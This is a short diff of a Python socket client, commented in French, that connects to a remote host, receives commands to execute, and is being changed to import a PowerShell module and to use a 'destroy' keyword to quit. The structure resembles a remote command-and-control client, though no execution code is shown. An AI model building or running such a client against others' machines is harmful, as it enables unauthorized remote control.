@@ -12,6 +12,7 @@ import json
 import threading
 from time import sleep
 
+from powershell import Powershell
 
 class Client():
     def __init__(self):
@@ -40,7 +41,7 @@ class Client():
         s.connect((host, port))
         data = {}
 
-        data["message"] = "Voici de l'information: TEST"
+        # data["message"] = "Voici de l'information: TEST"
         self._sending(s, data)
         sleep(1)
         data["message"] = "exit"
@@ -76,9 +77,9 @@ class Client():
             # on reçoit la commande à exécuter
             data = self._receiving(s)
             
-            # TODO: if whoami
+            
             # on 
-            if data["command"].lower() == "exit":
+            if data["command"].lower() == "destroy":
                 quitting = True
                 self._sending(s, data)
                 s.close()
